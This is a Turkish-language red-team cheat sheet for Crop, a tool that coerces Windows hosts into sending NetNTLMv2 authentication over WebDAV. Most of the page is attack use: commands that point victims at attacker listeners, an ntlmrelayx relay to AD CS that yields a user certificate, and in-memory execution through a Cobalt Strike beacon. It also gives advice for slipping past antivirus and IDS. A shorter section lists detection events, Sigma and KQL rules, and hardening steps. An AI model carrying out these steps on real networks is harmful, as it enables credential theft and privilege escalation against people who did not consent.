# Crop

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows sistemlerinde WebDAV isteklerini tetikleyerek (coercion) kurban makinelerin saldırganın HTTP/WebDAV dinleyicisine NetNTLM kimlik doğrulaması göndermesini sağlayan C# .NET aracı.

---

## 1. Genel Bakış ve Amaç

**Crop** (MDSec araştırmacıları tarafından geliştirilen), Windows işletim sistemlerinde yerel API çağrıları ve Shell arabirimleri üzerinden **WebDAV (Web Distributed Authoring and Versioning)** istemcisini tetikleyen hafif bir kimlik doğrulama zorlama (coercion) aracıdır.

Active Directory sızma testlerinde ve kırmızı takım operasyonlarında en sık karşılaşılan engellerden biri, ağ segmentleri arasında veya uç noktalarda SMB (TCP 445) ve RPC portlarının güvenlik duvarları tarafından kapatılmış olmasıdır. Klasik koersiyon araçları (SpoolSample, PetitPotam, DFSCoerce vb.) hedef sunucuyu SMB veya RPC üzerinden tetiklemeye çalışırken, Crop hedef sistemin **WebClient (DAV Mini-Redirector)** servisini uyararak istemcinin standart HTTP/HTTPS portları üzerinden bir WebDAV UNC yoluna bağlanmasını sağlar.

Crop, belirtilen UNC yolunu (`\\attacker_ip@port\share`) Windows Shell API'leri (`SHCreateItemFromParsingName`, `IShellItem` veya COM arabirimleri) aracılığıyla parse ettirir. Windows işletim sistemi bu yolu çözümlerken arka planda `WebClient` hizmetini uyandırır ve saldırganın kontrolündeki dinleyiciye (`Farmer`, `ntlmrelayx` veya `Responder`) HTTP `OPTIONS` / `PROPFIND` istekleri göndererek kullanıcının veya makine hesabının **NetNTLMv2** kimlik doğrulamasını başlatır.

```
       [ Saldırgan / C2 Beacon ]
                   |
     1. Crop.exe \\192.168.1.50@8080\share
                   |
                   v
     [ Windows Shell API / COM Arabirimi ]
                   |
     2. WebClient (svchost) Servisi Tetiklenir
                   v
     ================================================= Ağ (HTTP Trafiği)
                   |
                   v
          [ Saldırgan Dinleyici ]
          [ Farmer / ntlmrelayx ] (Port: 8080)
                   |
     3. HTTP 401 Unauthorized (NTLM Challenge Gönderilir)
                   |
                   v
     4. WebClient NetNTLMv2 Response Döner
                   |
                   v
          [ Hash Yakalandı / Relay Başarılı! ]
```

### Neden Önemli?
- **SMB Firewall Engellerini Baypas Eder:** Uç noktalar arasında SMB (445) engelli olsa dahi giden (outbound) HTTP/HTTPS trafiği genellikle serbesttir. Crop, kimlik zorlamasını web trafiği içerisine gizler.
- **RPC Olmadan Çalışır:** Klasik koersiyon teknikleri MS-RPRN veya MS-EFSR RPC borularını (named pipes) gerektirirken, Crop doğrudan istemci tarafı dosya/klasör çözümleme mantığını kullanır.
- **Bellekten Yürütme (In-Memory Execution):** C# .NET ile yazıldığı için Cobalt Strike, Havoc veya Sliver üzerinde `execute-assembly` yöntemiyle diske dosya bırakmadan doğrudan çalıştırılabilir.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | Crop | PetitPotam | SpoolSample |
|---|---|---|---|
| **Kullandığı Protokol** | WebDAV (HTTP / HTTPS) | MS-EFSR (MS-RPC / SMB 445) | MS-RPRN (MS-RPC / SMB 445) |
| **Gereken Portlar** | Keyfi HTTP Portları (80, 8080, 443) | TCP 445 veya RPC Dinamik Portları | TCP 445 veya RPC Dinamik Portları |
| **Çalıştığı Hedef** | Windows İstemcileri (WebClient aktif) | Domain Controller / Sunucular | Print Spooler açık sunucular |
| **Hedef Hesap Türü** | Giriş yapmış kullanıcı / Makine | SYSTEM / Makine Hesabı (DC$) | SYSTEM / Makine Hesabı (SRV$) |
| **Relay Hedefi** | AD CS, LDAP, SMB | AD CS (HTTP/PKINIT), LDAP | LDAP, AD CS, SMB |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Crop yalın bir sözdizimine sahiptir; çalıştırılırken hedef WebDAV UNC yolunu argüman olarak alır.

```cmd
Crop.exe <WebDAV_UNC_Yolu> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre / Argüman | Açıklama | Örnek Değer |
|---|---|---|
| `<WebDAV_UNC_Yolu>` | Kurbanın bağlanmaya zorlanacağı hedef WebDAV UNC adresi (Zorunlu). | `\\192.168.1.50@8080\share` |
| `@<Port>` | Bağlanılacak özel HTTP port numarası. | `@8080`, `@8888` |
| `@SSL@<Port>` | Şifreli HTTPS üzerinden WebDAV bağlantısı kurma formatı. | `@SSL@443` |
| `[Yöntem]` | Arka planda kullanılacak Shell API veya COM arayüz seçeneği. | Varsayılan: Shell Parsing |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart WebDAV Tetikleme ve Farmer Entegrasyonu

Saldırgan makinede port 8080 üzerinde `Farmer` çalışırken kurban Windows makinesinde Crop ile kimlik zorlaması tetikleme.

```cmd
# 1. Adım: Saldırgan makinede Farmer'ı başlat
# Farmer.exe 8080 hashes.txt

# 2. Adım: Kurban sistemde Crop'u çalıştır
Crop.exe \\192.168.1.50@8080\test
```

```text
[*] Crop WebDAV Coercer initialized.
[*] Parsing target UNC path: \\192.168.1.50@8080\test
[+] Invoking Windows Shell parsing APIs...
[+] WebClient service successfully dispatched authentication request.
[*] Coercion completed. Check your WebDAV listener for hashes!
```
*Analiz:* Crop, Windows Shell API'sini çağırarak `192.168.1.50:8080` adresine bir istek gönderilmesini sağladı. Farmer dinleyicisinde anında kurban kullanıcının NetNTLMv2 hash'i yakalandı.

---

### Senaryo 2: Cobalt Strike Beacon Üzerinden Dosyasız (In-Memory) Yürütme

Ele geçirilmiş bir Windows uç noktasında C2 Beacon üzerinden bellekten Crop çalıştırma.

```text
beacon> execute-assembly C:\Tools\Crop.exe \\10.10.14.5@8080\share
```

```text
[*] Tasked beacon to run assembly: Crop.exe \\10.10.14.5@8080\share
[+] host called home, sent: 32768 bytes
[+] Shell item parsing initiated for \\10.10.14.5@8080\share
[+] WebClient network connection dispatched!
```
*Analiz:* Diske dosya yazılmadan doğrudan bellekten Crop çalıştırıldı ve Beacon'ın bulunduğu makineden saldırgan IP'sine doğru WebDAV bağlantısı açıldı.

---

### Senaryo 3: Şifreli HTTPS (SSL) WebDAV Koersiyonu

Ağda derin paket incelemesi (DPI) yapan sistemleri veya proxy engellerini atlatmak için 443 HTTPS portu üzerinden tetikleme.

```cmd
Crop.exe \\attacker.corp.local@SSL@443\payload
```

```text
[*] Target specified with SSL encapsulation: \\attacker.corp.local@SSL@443\payload
[+] Initiating secure WebDAV request...
[+] TLS Handshake completed with remote listener.
[+] NTLM authentication over SSL successfully coerced.
```
*Analiz:* İstemci şifreli HTTPS üzerinden kimlik doğruladı; ağ üzerindeki IDS/IPS sistemleri HTTP başlıklarını ve NTLM paketlerini açık metin olarak göremedi.

---

### Senaryo 4: Crop ile ntlmrelayx AD CS Relay Zinciri

Crop tarafından tetiklenen WebDAV isteğini `ntlmrelayx` üzerinden kurumsal Sertifika Otoritesine (AD CS) aktararak kullanıcı sertifikası çekme.

```bash
# Kali Saldırgan Makinesinde ntlmrelayx WebDAV / HTTP dinleyicisi:
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template User
```
```cmd
# Kurban Windows Makinesinde Crop tetiklemesi:
Crop.exe \\192.168.1.50@80\enrollment
```

```text
[ntlmrelayx Konsolu]
[*] HTTP Client connected from 192.168.1.115 (WebDAV MiniRedir)
[*] Relaying authentication for LAB\selim.kaya to AD CS...
[+] Successfully requested certificate for LAB\selim.kaya!
[+] Base64 PFX Certificate written to selim.pfx
```
*Analiz:* Crop ile tetiklenen WebDAV isteği doğrudan Sertifika Otoritesine relay edildi ve kullanıcının özel anahtarlı sertifikası elde edildi.

---

### Senaryo 5: Yerel Ağda Standart HTTP Portu ile Sessiz Tetikleme

Özel portlar güvenlik duvarına takıldığında varsayılan port 80 üzerinden çalıştırma.

```cmd
Crop.exe \\192.168.1.50\davshare
```

```text
[*] Parsing UNC path without custom port (Default HTTP Port 80 assumed)
[+] WebDAV Mini-Redirector connected to 192.168.1.50:80
[+] Authentication handshake delivered.
```
*Analiz:* Standart port kullanıldığı için kurban makine doğrudan yerel HTTP portuna yöneldi ve kısıtlamalara takılmadı.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `The WebClient service is disabled or not installed` | Windows Server sistemlerinde WebClient özelliği varsayılan olarak yüklü değildir veya hizmet `Disabled` durumdadır. | Windows Server'da önce WebClient özelliğini kurun (`Install-WindowsFeature WebDAV-Redirector`) veya masaüstü (Windows 10/11) hedeflerine odaklanın ya da RPC koersiyonuna (PetitPotam) geçin. |
| `COMException / Shell parsing failed: 0x80070035` | Belirtilen UNC yolu çözümlenemedi (Ağ yolu bulunamadı). | Hedef IP adresinin erişilebilir olduğunu ping/telnet ile doğrulayın ve `@port` sözdizimini kontrol edin. |
| `WebClient PROPFIND gönderdi fakat 401 yanıtı alamadı` | Dinleyici makinede Farmer veya ntlmrelayx açık değil veya port dinlenmiyor. | Dinleyicinin ilgili portta hazır olduğunu (`ss -tulpn` veya `netstat -an`) doğrulayın. |
| `Only Anonymous connection received (No NTLM Challenge)` | Hedef sistem saldırgan IP'sini "İnternet Bölgesi" kabul ettiği için otomatik NTLM göndermeyi reddediyor. | Saldırgan IP'sinin FQDN adını kullanın veya kurbanın Intranet / Trusted Sites listesinde yer almasını sağlayın. |
| `Windows Defender Antivirus blocked executable` | Crop.exe derlemesi bilinen imzalar nedeniyle engellendi. | C# kaynak kodunu hafifçe yeniden adlandırıp (obfuscation) derleyin veya `execute-assembly` ile doğrudan bellekten yürütün. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Windows Event ID 4624 (Logon):**
  - Logon Type: `3` (Network Logon).
  - Kimlik doğrulama paketi: `NTLM`.
- **WebClient Operasyonel Logları (Event ID 900 / 901):**
  - WebClient servisinin uzak WebDAV URL'sine erişim kayıtları.
- **Sysmon Event ID 1 (Process Creation):**
  - `Crop.exe` çalıştırılma komut satırı ve parametreleri.
- **Sysmon Event ID 3 (Network Connection):**
  - `svchost.exe` (WebClient barındıran) sürecinin harici bir IP'nin 8080/80 portuna yaptığı bağlantı.

### 5.2 Ağ ve EDR İmzaları
- **Anormal WebDAV Trafiği:** Kurumsal iç ağda istemciler arasında alışılmadık portlara (8080, 8888 vb.) yapılan HTTP `PROPFIND` veya `OPTIONS` istekleri.
- **User-Agent Başlığı:** İsteklerde `User-Agent: Microsoft-WebDAV-MiniRedir/...` başlığının bulunması.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1187** | Forced Authentication | WebDAV üzerinden kimlik doğrulama zorlama. |
| **T1059** | Command and Scripting Interpreter | C# veya komut satırı üzerinden koersiyon yürütme. |
| **T1557** | Adversary-in-the-Middle | Tetiklenen kimliği ele geçirme veya relay etme. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Dosya İzleri:** Diske indirilen `.exe` statik imzalara takılabilir. | Derlenmiş ikiliyi diske yazmak yerine `execute-assembly` ile RAM'de çalıştırın. |
| **Ağ İncelemesi:** Açık HTTP portları IDS/IPS tarafından izlenebilir. | Mümkünse `@SSL@443` kullanarak trafiği HTTPS ile şifreleyin. |
| **Gereksiz Tetikleme:** Birden fazla kez çalıştırmak log kirliliği yaratır. | Dinleyicinizin hazır olduğundan emin olduktan sonra tek bir kez tetikleyin. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — WebDAV Coercion Activity)
```yaml
title: Potential WebDAV Coercion via Shell API
status: experimental
description: WebClient servisinin beklenmeyen iç veya dış IP'lere WebDAV protokolüyle bağlanması.
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        InitiatingProcessCommandLine|contains: 'WebClient'
        DestinationPort:
            - 8080
            - 8888
            - 8000
    condition: selection
level: medium
```

#### Tespit Kuralı (KQL — Microsoft Sentinel / Defender for Endpoint)
```kql
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "svchost.exe"
| where ActionType == "ConnectionSuccess"
| where RemotePort in (80, 8080, 8888, 443)
| where AdditionalFields has "Microsoft-WebDAV-MiniRedir"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RemoteIP, RemotePort
```

#### Sertleştirme Adımları
1. **WebClient Servisini Kapatma:** İhtiyaç duyulmayan tüm Windows uç noktalarında ve sunucularda WebClient servisi tamamen devre dışı bırakılmalıdır:
   ```cmd
   sc config WebClient start= disabled
   net stop WebClient
   ```
2. **Giden WebDAV Trafiğini Engelleme:** Host ve çevre güvenlik duvarlarında iç istemcilerin rastgele HTTP portlarına erişimi kısıtlanmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```cmd
# 1. Standart HTTP port 8080 üzerinde tetikleme
Crop.exe \\192.168.1.50@8080\share
```
- **Ne Yapar?:** WebClient servisini uyandırıp `192.168.1.50:8080` adresine WebDAV isteği yollar.
- **Ne Zaman Kullanılır?:** Dinleyiciniz (Farmer/ntlmrelayx) 8080 portunda açıkken.
- **Parametreler:** `@8080`: Özel port belirteci.

```text
# 2. Cobalt Strike Beacon üzerinden doğrudan bellekten yürütme
beacon> execute-assembly C:\Tools\Crop.exe \\10.10.14.5@8080\test
```
- **Ne Yapar?:** Crop'u diske dosya yazmadan Beacon sürecinin RAM'inde çalıştırır.
- **Ne Zaman Kullanılır?:** EDR atlatma ve sessiz operasyon senaryolarında.
- **Parametreler:** `execute-assembly`: Bellek yürütücüsü.

```cmd
# 3. Şifreli HTTPS portu ile güvenli tetikleme
Crop.exe \\attacker.lab.local@SSL@443\share
```
- **Ne Yapar?:** WebDAV isteğini TLS/SSL katmanında şifreleyerek 443 portundan gönderir.
- **Ne Zaman Kullanılır?:** Ağda derin paket inceleme (DPI) veya proxy denetimi varken.
- **Parametreler:** `@SSL@443`: SSL şifreli WebDAV portu.

```cmd
# 4. Varsayılan HTTP port 80 ile tetikleme
Crop.exe \\192.168.1.50\share
```
- **Ne Yapar?:** Port belirtilmediğinde varsayılan HTTP 80 üzerinden istek açar.
- **Ne Zaman Kullanılır?:** Yüksek portlar güvenlik duvarı tarafından engellendiğinde.
- **Parametreler:** Standart UNC formatı.

```cmd
# 5. Özel yüksek port üzerinden tetikleme (Örn: 8888)
Crop.exe \\192.168.1.50@8888\dav
```
- **Ne Yapar?:** Dinleyicinin çalıştığı 8888 portuna WebDAV bağlantısı zorlar.
- **Ne Zaman Kullanılır?:** Port 80 ve 8080 sistemde başka servislerce işgal edildiğinde.
- **Parametreler:** `@8888`: Belirtilen TCP portu.

```bash
# 6. ntlmrelayx dinleyicisi ile birlikte çalıştırma
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs
```
- **Ne Yapar?:** Crop tarafından tetiklenen kimliği yakalayıp AD CS sertifika servisine aktarır.
- **Ne Zaman Kullanılır?:** Kimlik doğrulama zorlamasından sonra yetki yükseltmek için.
- **Parametreler:** `--adcs`: Sertifika relay modu.

```powershell
# 7. WebClient servis durumunu PowerShell ile kontrol etme
Get-Service WebClient | Select-Object -Property Name, Status, StartType
```
- **Ne Yapar?:** Kurban makinede WebClient servisinin yüklü ve çalışır olup olmadığını sorgular.
- **Ne Zaman Kullanılır?:** Crop çalıştırmadan önce hedefin uygunluğunu doğrulamak için.
- **Parametreler:** Standart PowerShell servis sorgusu.

```powershell
# 8. WebClient servisini manuel olarak başlatma (Yetki varsa)
Start-Service WebClient
```
- **Ne Yapar?:** Kapalı veya durdurulmuş WebClient servisini aktif hale getirir.
- **Ne Zaman Kullanılır?:** Shell çağrısı servisi otomatik başlatamazsa.
- **Parametreler:** Standart PowerShell başlatma komutu.

```cmd
# 9. rundll32 ile WebClient servisini tetikleme (LOLBin alternatifi)
rundll32.exe davclnt.dll,DavRegisterAuthCallback
```
- **Ne Yapar?:** Crop öncesinde WebClient servisini arka planda ayağa kaldırır.
- **Ne Zaman Kullanılır?:** Servis `Manual` modda uyurken servisi uyandırmak için.
- **Parametreler:** `davclnt.dll`: WebDAV istemci kütüphanesi.

```cmd
# 10. WebClient AuthForwardServerList kayıt defteri kontrolü
reg query HKLM\SYSTEM\CurrentControlSet\Services\WebClient\Parameters /v AuthForwardServerList
```
- **Ne Yapar?:** WebClient'ın hangi sunuculara otomatik NTLM kimlik bilgisi göndereceğini denetler.
- **Ne Zaman Kullanılır?:** Hedef sistemin otomatik NTLM gönderip göndermeyeceğini anlamak için.
- **Parametreler:** `reg query`: Kayıt defteri sorgulama.

---

## Kaynaklar

- **MDSec — Crop GitHub Deposu:** [https://github.com/mdsecactivebreach/Crop](https://github.com/mdsecactivebreach/Crop)
- **MDSec Araştırması — Coercing NTLM Authentication over WebDAV:** [https://www.mdsec.co.uk/](https://www.mdsec.co.uk/)
- **Microsoft — Shell APIs and IShellItem:** [https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-ishellitem](https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-ishellitem)

---

> **Önceki:** [← Farmer](./Farmer.md) · **Sonraki:** [Pre2k →](./Pre2k.md)

